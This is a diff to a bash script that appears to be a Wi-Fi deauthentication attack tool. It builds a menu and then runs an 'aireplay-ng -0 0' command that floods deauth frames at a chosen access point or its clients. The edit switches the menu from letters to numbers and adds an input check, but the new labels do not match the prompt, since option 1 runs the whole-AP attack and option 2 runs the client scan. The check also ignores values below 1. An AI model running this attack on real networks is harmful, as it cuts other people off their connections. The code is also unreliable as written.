@@ -53,8 +53,15 @@ echo "								                                        "
 tput sgr0
 #end of artwork
 #opt
-echo "Choose an attack option [single client(c) whole AP(a) find hidden(h)]:"
+echo "Choose an attack option [single client(1) whole AP(2) find hidden(3)]:"
 read ask
+if [ $ask -gt 3 ]
+then
+tput setaf 1
+echo "This option does not exist!"
+tput sgr0
+exit 1
+fi
 #opt end
 iwconfig
 echo "Interface name(e.g. wlan0):"
@@ -72,13 +79,13 @@ read macacc
 echo "loading attack..."
 tput setaf 1
 jumpto $ask
-a:
+1:
 sudo aireplay-ng -0 0 -a $macacc -b $macacc $inter\mon
 sudo airmon-ng stop $inter\mon > /dev/null
 tput sgr0
 exit 0
 #options
-c:
+2:
 echo "How long should be searched for Clients? [sec]:"
 read secs
 echo "reading clients from network.. [scanning $secs seconds]"
@@ -92,7 +99,7 @@ sudo service network-manager start
 sudo airmon-ng stop $inter\mon > /dev/null
 tput sgr0
 exit 0
-h:
+3:
 echo "How long to scan? [sec]:"
 read secs
 echo "scanning.. [$secs sec]"
